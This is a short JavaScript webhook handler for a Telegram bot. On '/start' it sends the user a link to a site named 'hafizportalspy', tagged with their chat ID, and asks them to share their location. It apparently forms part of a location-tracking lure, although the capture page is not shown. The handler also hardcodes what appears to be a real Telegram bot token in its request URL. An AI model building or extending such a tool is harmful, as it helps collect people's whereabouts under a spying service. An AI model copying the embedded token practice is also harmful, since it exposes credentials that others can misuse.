export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).end("Only POST allowed");

  const data = req.body;
  if (data.message && data.message.text === "/start") {
    const chatId = data.message.chat.id;
    const userName = data.message.from.first_name || "User";

    const link = `https://hafizportalspy.vercel.app/?id=${chatId}`;

    const text = `Salam ${userName},\nClick the link below to share your location:\n${link}`;

    await fetch(`https://api.telegram.org/bot7737650968:AAHsvAEaKL5kOCcgQ4RPtyVjeN3-Hl5Aw1k/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
      }),
    });

    return res.status(200).json({ ok: true });
  }

  res.status(200).json({ ok: true, message: "Ignored" });
}
